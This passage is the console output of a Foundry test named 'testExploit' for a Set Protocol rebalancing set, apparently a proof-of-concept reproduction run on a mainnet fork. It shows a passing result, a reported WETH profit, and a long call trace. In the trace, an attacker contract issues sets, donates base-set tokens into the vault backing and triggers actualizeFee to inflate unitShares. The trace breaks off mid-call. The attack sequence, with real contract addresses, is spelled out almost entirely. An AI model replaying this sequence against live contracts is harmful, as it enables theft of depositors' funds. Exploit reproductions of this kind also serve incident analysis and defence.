@@ -1,0 +1,426 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/SetProtocolETHMACOAPY_exp.sol:SetProtocolETHMACOAPY_exp
+[PASS] testExploit() (gas: 1616965)
+Logs:
+  unitShares before actualizeFee: 12253
+  unitShares after  actualizeFee: 12264
+  base set donated into rSet backing: 1.490116119384007401
+  WETH profit (tx1): 4.047988247781965824
+
+Traces:
+  [3923] SetProtocolETHMACOAPY_exp::setUp()
+    ├─ [0] VM::createSelectFork("<rpc url>", 26132513 [2.613e7])
+    │   └─ ← [Return] 1
+    └─ ← [Stop]
+
+  [1798865] SetProtocolETHMACOAPY_exp::testExploit()
+    ├─ [841733] → new SetAttacker@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─ [2831] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::currentSet() [staticcall]
+    │   │   └─ ← [Return] SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4]
+    │   └─ ← [Return] 4167 bytes of code
+    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::record()
+    │   └─ ← [Return]
+    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::accesses(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
+    │   └─ ← [Return] [0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60], []
+    ├─ [0] VM::load(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ emit WARNING_UninitedSlot(who: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, slot: 5825609806085329600055018438565692856737946360302145295836091025613143833952 [5.825e75])
+    ├─ [0] VM::load(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::store(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
+    │   └─ ← [Return]
+    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [0] VM::store(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60, 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ emit SlotFound(who: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, fsig: 0x70a08231, keysHash: 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11, slot: 5825609806085329600055018438565692856737946360302145295836091025613143833952 [5.825e75])
+    ├─ [0] VM::load(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [0] VM::store(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60, 0x0000000000000000000000000000000000000000000018905f62bda8e0800000)
+    │   └─ ← [Return]
+    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 116000000000000000000000 [1.16e23]
+    ├─ [633329] SetAttacker::run()
+    │   ├─ [2535] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::naturalUnit() [staticcall]
+    │   │   └─ ← [Return] 1000000 [1e6]
+    │   ├─ [24420] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::approve(0x882d80D3a191859d64477eb78Cca46599307ec1C, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x882d80D3a191859d64477eb78Cca46599307ec1C, amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xec45f80de6a052dfb2f5a752d21a2c4bb6d471c737619debb9ef25405728b78f: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   ├─ [24854] SetToken::approve(0x882d80D3a191859d64477eb78Cca46599307ec1C, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x882d80D3a191859d64477eb78Cca46599307ec1C, amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x3a857b1365188314d9d21b2abd613573c1be88a753c598136e6099a6a09525a8: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   ├─ [128336] Core::issue(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], 1728534698486328000000 [1.728e21])
+    │   │   ├─ [3697] 0xdC733EC262F32882F7C05525cc2D09F2C04D86Ac::isMultipleOfSetNaturalUnit(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], 1728534698486328000000 [1.728e21]) [delegatecall]
+    │   │   │   ├─ [2477] SetToken::naturalUnit() [staticcall]
+    │   │   │   │   └─ ← [Return] 1000000 [1e6]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [477] SetToken::naturalUnit() [staticcall]
+    │   │   │   └─ ← [Return] 1000000 [1e6]
+    │   │   ├─ [5148] SetToken::getComponents() [staticcall]
+    │   │   │   └─ ← [Return] [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   ├─ [5028] SetToken::getUnits() [staticcall]
+    │   │   │   └─ ← [Return] [67108864 [6.71e7]]
+    │   │   ├─ [1830] 0x5f3F534D0C5Ea126150Ec8078d404464339503ca::calculateRequiredComponentQuantities([67108864 [6.71e7]], 1000000 [1e6], 1728534698486328000000 [1.728e21]) [delegatecall]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000018905f62bda8e0000000
+    │   │   ├─ [8694] 0x5f3F534D0C5Ea126150Ec8078d404464339503ca::calculateDepositAndDecrementQuantities([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [115999999999999991611392 [1.159e23]], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [delegatecall]
+    │   │   │   ├─ [2739] Vault::getOwnerBalance(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000018905f62bda8e0000000
+    │   │   ├─ [3723] Vault::batchDecrementTokenOwner([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [0])
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [20135] 0x882d80D3a191859d64477eb78Cca46599307ec1C::batchTransfer([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [115999999999999991611392 [1.159e23]], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc])
+    │   │   │   ├─ [3634] 0xeaDadA7c6943c223C0d4bEA475a6DACC7368f8d6::balanceOf(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [delegatecall]
+    │   │   │   │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 486027134994691752360 [4.86e20]
+    │   │   │   │   └─ ← [Return] 486027134994691752360 [4.86e20]
+    │   │   │   ├─ [7235] 0xeaDadA7c6943c223C0d4bEA475a6DACC7368f8d6::transferFrom(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc], 115999999999999991611392 [1.159e23]) [delegatecall]
+    │   │   │   │   ├─ [6225] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc], 115999999999999991611392 [1.159e23])
+    │   │   │   │   │   ├─ emit Transfer(from: SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc], amount: 115999999999999991611392 [1.159e23])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x97aa7a62e57c65c478bd236d741fe33d6d6f98713895c11f98ea1dec7f1cd157: 0x00000000000000000000000000000000000000000000001a58fb40320f6d81a8 → 0x0000000000000000000000000000000000000000000018aab85dfddaef6d81a8
+    │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x0000000000000000000000000000000000000000000018905f62bda8e0800000 → 0x0000000000000000000000000000000000000000000000000000000000800000
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [1634] 0xeaDadA7c6943c223C0d4bEA475a6DACC7368f8d6::balanceOf(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [delegatecall]
+    │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 116486027134994683363752 [1.164e23]
+    │   │   │   │   └─ ← [Return] 116486027134994683363752 [1.164e23]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [6912] Vault::batchIncrementTokenOwner([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], [115999999999999991611392 [1.159e23]])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0c3a207a10e401343879fda73b5f0649c53ad9688e916d222f16515970e4984b: 0x0000000000000000000000000000000000000000000000023a873dff70000000 → 0x00000000000000000000000000000000000000000000189299e9fba850000000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [37595] SetToken::mint(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1728534698486328000000 [1.728e21])
+    │   │   │   ├─ [2315] SetTokenFactory::core()
+    │   │   │   │   └─ ← [Return] Core: [0xf55186CC537E7067EA616F2aaE007b4427a120C8]
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 1728534698486328000000 [1.728e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000000000880648870baaf00 → 0x00000000000000000000000000000000000000000000005dbcbd42a30f3fad00
+    │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 0x00000000000000000000000000000000000000000000005db43cde1a9e84fe00
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit SetIssued(_setAddress: SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], _quantity: 1728534698486328000000 [1.728e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 16: 93202 → 93203
+    │   │   └─ ← [Stop]
+    │   ├─ [94337] Core::issue(0xB647a1D7633c6C4d434e22eE9756b36F2b219525, 140948713161425283000000 [1.409e23])
+    │   │   ├─ [1755] 0xdC733EC262F32882F7C05525cc2D09F2C04D86Ac::isMultipleOfSetNaturalUnit(0xB647a1D7633c6C4d434e22eE9756b36F2b219525, 140948713161425283000000 [1.409e23]) [delegatecall]
+    │   │   │   ├─ [535] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::naturalUnit() [staticcall]
+    │   │   │   │   └─ ← [Return] 1000000 [1e6]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [535] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::naturalUnit() [staticcall]
+    │   │   │   └─ ← [Return] 1000000 [1e6]
+    │   │   ├─ [1390] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::getComponents() [staticcall]
+    │   │   │   └─ ← [Return] [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4]
+    │   │   ├─ [3114] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::getUnits() [staticcall]
+    │   │   │   └─ ← [Return] [12253 [1.225e4]]
+    │   │   ├─ [1830] 0x5f3F534D0C5Ea126150Ec8078d404464339503ca::calculateRequiredComponentQuantities([12253 [1.225e4]], 1000000 [1e6], 140948713161425283000000 [1.409e23]) [delegatecall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000005d9f8ee9636c8d5b17
+    │   │   ├─ [6194] 0x5f3F534D0C5Ea126150Ec8078d404464339503ca::calculateDepositAndDecrementQuantities([0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], [1727044582366943992599 [1.727e21]], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [delegatecall]
+    │   │   │   ├─ [2739] Vault::getOwnerBalance(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000005d9f8ee9636c8d5b17
+    │   │   ├─ [1723] Vault::batchDecrementTokenOwner([0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [0])
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [18729] 0x882d80D3a191859d64477eb78Cca46599307ec1C::batchTransfer([0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], [1727044582366943992599 [1.727e21]], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc])
+    │   │   │   ├─ [3750] 0xeaDadA7c6943c223C0d4bEA475a6DACC7368f8d6::balanceOf(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [delegatecall]
+    │   │   │   │   ├─ [2650] SetToken::balanceOf(Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 611835777844292705 [6.118e17]
+    │   │   │   │   └─ ← [Return] 611835777844292705 [6.118e17]
+    │   │   │   ├─ [10097] 0xeaDadA7c6943c223C0d4bEA475a6DACC7368f8d6::transferFrom(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc], 1727044582366943992599 [1.727e21]) [delegatecall]
+    │   │   │   │   ├─ [9087] SetToken::transferFrom(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc], 1727044582366943992599 [1.727e21])
+    │   │   │   │   │   ├─ emit Transfer(from: SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc], amount: 1727044582366943992599 [1.727e21])
+    │   │   │   │   │   ├─ emit Approval(owner: SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x882d80D3a191859d64477eb78Cca46599307ec1C, amount: 115792089237316195423570985008687907853269984665640564037730539425546185647336 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x664429697a97029c9cd91f225e37da6c8fd4ffd5ea690bc7a6ec9d05402ce967: 0x000000000000000000000000000000000000000000000000087dad65f748ac61 → 0x00000000000000000000000000000000000000000000005da80c96c963d60778
+    │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x00000000000000000000000000000000000000000000005db43cde1a9e84fe00 → 0x00000000000000000000000000000000000000000000000014adf4b731f7a2e9
+    │   │   │   │   │   │   @ 0x3a857b1365188314d9d21b2abd613573c1be88a753c598136e6099a6a09525a8: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffa26071169c9372a4e8
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [1750] 0xeaDadA7c6943c223C0d4bEA475a6DACC7368f8d6::balanceOf(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [delegatecall]
+    │   │   │   │   ├─ [650] SetToken::balanceOf(Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1727656418144788285304 [1.727e21]
+    │   │   │   │   └─ ← [Return] 1727656418144788285304 [1.727e21]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [6912] Vault::batchIncrementTokenOwner([0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], 0xB647a1D7633c6C4d434e22eE9756b36F2b219525, [1727044582366943992599 [1.727e21]])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xea45ed5572f582e2696e9a1791bef942b355f846ffaec5f5492a9536fa358d31: 0x00000000000000000000000000000000000000000000000001ad56ba2c384a1f → 0x00000000000000000000000000000000000000000000005da13c401d98c5a536
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [37358] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::mint(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 140948713161425283000000 [1.409e23])
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 140948713161425283000000 [1.409e23])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 0x000000000000000000000000000000000000000000001dd8d85542074b5126c0
+    │   │   │   │   @ 2: 0x000000000000000000000000000000000000000000000000dfcc303edf8451c0 → 0x000000000000000000000000000000000000000000001dd9b82172462ad57880
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit SetIssued(_setAddress: 0xB647a1D7633c6C4d434e22eE9756b36F2b219525, _quantity: 140948713161425283000000 [1.409e23])
+    │   │   ├─  storage changes:
+    │   │   │   @ 16: 93203 → 93204
+    │   │   └─ ← [Stop]
+    │   ├─ [650] SetToken::balanceOf(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 1490116119384007401 [1.49e18]
+    │   ├─ [36505] Core::deposit(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], 1490116119384007401 [1.49e18])
+    │   │   ├─ [13003] 0x882d80D3a191859d64477eb78Cca46599307ec1C::transfer(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], 1490116119384007401 [1.49e18], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc])
+    │   │   │   ├─ [1750] 0xeaDadA7c6943c223C0d4bEA475a6DACC7368f8d6::balanceOf(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [delegatecall]
+    │   │   │   │   ├─ [650] SetToken::balanceOf(Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1727656418144788285304 [1.727e21]
+    │   │   │   │   └─ ← [Return] 1727656418144788285304 [1.727e21]
+    │   │   │   ├─ [7297] 0xeaDadA7c6943c223C0d4bEA475a6DACC7368f8d6::transferFrom(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc], 1490116119384007401 [1.49e18]) [delegatecall]
+    │   │   │   │   ├─ [6287] SetToken::transferFrom(SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc], 1490116119384007401 [1.49e18])
+    │   │   │   │   │   ├─ emit Transfer(from: SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc], amount: 1490116119384007401 [1.49e18])
+    │   │   │   │   │   ├─ emit Approval(owner: SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x882d80D3a191859d64477eb78Cca46599307ec1C, amount: 115792089237316195423570985008687907853269984665640564037729049309426801639935 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x00000000000000000000000000000000000000000000000014adf4b731f7a2e9 → 0
+    │   │   │   │   │   │   @ 0x664429697a97029c9cd91f225e37da6c8fd4ffd5ea690bc7a6ec9d05402ce967: 0x00000000000000000000000000000000000000000000005da80c96c963d60778 → 0x00000000000000000000000000000000000000000000005dbcba8b8095cdaa61
+    │   │   │   │   │   │   @ 0x3a857b1365188314d9d21b2abd613573c1be88a753c598136e6099a6a09525a8: 0xffffffffffffffffffffffffffffffffffffffffffffffa26071169c9372a4e8 → 0xffffffffffffffffffffffffffffffffffffffffffffffa24bc321e5617b01ff
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [1750] 0xeaDadA7c6943c223C0d4bEA475a6DACC7368f8d6::balanceOf(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [delegatecall]
+    │   │   │   │   ├─ [650] SetToken::balanceOf(Vault: [0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1729146534264172292705 [1.729e21]
+    │   │   │   │   └─ ← [Return] 1729146534264172292705 [1.729e21]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [21205] Vault::incrementTokenOwner(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1490116119384007401 [1.49e18])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x41c8c50ef94d0d84469450ccde0e1114423301711f957fea9b9e0fb49e1d9aff: 0 → 0x00000000000000000000000000000000000000000000000014adf4b731f7a2e9
+    │   │   │   └─ ← [Stop]
+    │   │   ├─  storage changes:
+    │   │   │   @ 16: 93204 → 93205
+    │   │   └─ ← [Stop]
+    │   ├─ [3882] Core::internalTransfer(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], 0xB647a1D7633c6C4d434e22eE9756b36F2b219525, 1490116119384007401 [1.49e18])
+    │   │   ├─ [2304] Vault::transferBalance(SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4], SetAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xB647a1D7633c6C4d434e22eE9756b36F2b219525, 1490116119384007401 [1.49e18])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x41c8c50ef94d0d84469450ccde0e1114423301711f957fea9b9e0fb49e1d9aff: 0x00000000000000000000000000000000000000000000000014adf4b731f7a2e9 → 0
+    │   │   │   │   @ 0xea45ed5572f582e2696e9a1791bef942b355f846ffaec5f5492a9536fa358d31: 0x00000000000000000000000000000000000000000000005da13c401d98c5a536 → 0x00000000000000000000000000000000000000000000005db5ea34d4cabd481f
+    │   │   │   └─ ← [Stop]
+    │   │   ├─  storage changes:
+    │   │   │   @ 16: 93205 → 93206
+    │   │   └─ ← [Stop]
+    │   ├─ [537] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::unitShares() [staticcall]
+    │   │   └─ ← [Return] 12253 [1.225e4]
+    │   ├─ [91196] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::actualizeFee()
+    │   │   ├─ [72490] PerformanceFeeCalculator::updateAndGetFee()
+    │   │   │   ├─ [768] Core::validSets(0xB647a1D7633c6C4d434e22eE9756b36F2b219525) [staticcall]
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [537] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::unitShares() [staticcall]
+    │   │   │   │   └─ ← [Return] 12253 [1.225e4]
+    │   │   │   ├─ [535] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::naturalUnit() [staticcall]
+    │   │   │   │   └─ ← [Return] 1000000 [1e6]
+    │   │   │   ├─ [831] 0xB647a1D7633c6C4d434e22eE9756b36F2b219525::currentSet() [staticcall]
+    │   │   │   │   └─ ← [Return] SetToken: [0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4]
+    │   │   │   ├─ [1148] SetToken::getComponents() [staticcall]
+    │   │   │   │   └─ ← [Return] [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   │   ├─ [1028] SetToken::getUnits() [staticcall]
+    │   │   │   │   └─ ← [Return] [67108864 [6.71e7]]
+    │   │   │   ├─ [477] SetToken::naturalUnit() [staticcall]
+    │   │   │   │   └─ ← [Return] 1000000 [1e6]
+    │   │   │   ├─ [2991] OracleWhiteList::getOracleAddressByToken(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x761864f867dFd70340F6eab0B6f0BC74e18bA178
+    │   │   │   ├─ [2278] 0x761864f867dFd70340F6eab0B6f0BC74e18bA178::read() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   ├─ [2444] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::decimals() [staticcall]
+    │   │   │   │   └─ ← [Return] 18
